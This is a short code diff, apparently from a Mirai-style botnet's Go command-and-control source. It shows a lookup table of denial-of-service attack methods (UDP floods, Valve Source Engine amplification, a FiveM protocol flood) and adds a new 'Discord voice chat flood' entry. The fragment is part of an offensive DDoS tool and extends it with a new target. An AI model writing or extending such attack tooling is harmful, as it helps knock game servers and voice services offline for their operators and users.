@@ -55,6 +55,7 @@ var attackInfoLookup = map[string]AttackInfo{
 	"udp":      {0, []uint8{0, 1, 6, 7, 13}, "UDP flood optimized for Gbps"},
 	"vse":      {1, []uint8{0, 1, 6, 7, 13}, "Valve Source Engine A2S_INFO amplification"},
 	"fivem":    {2, []uint8{0, 1, 6, 7, 13}, "FiveM protocol flood (getinfo/sec/token)"},
+	"discord":  {30, []uint8{0, 1, 6, 7, 13}, "Discord voice chat flood"},
 	"pps":      {3, []uint8{6, 7, 13}, "High PPS UDP flood"},
 
 	/* APEX 2.0 L7 Methods */
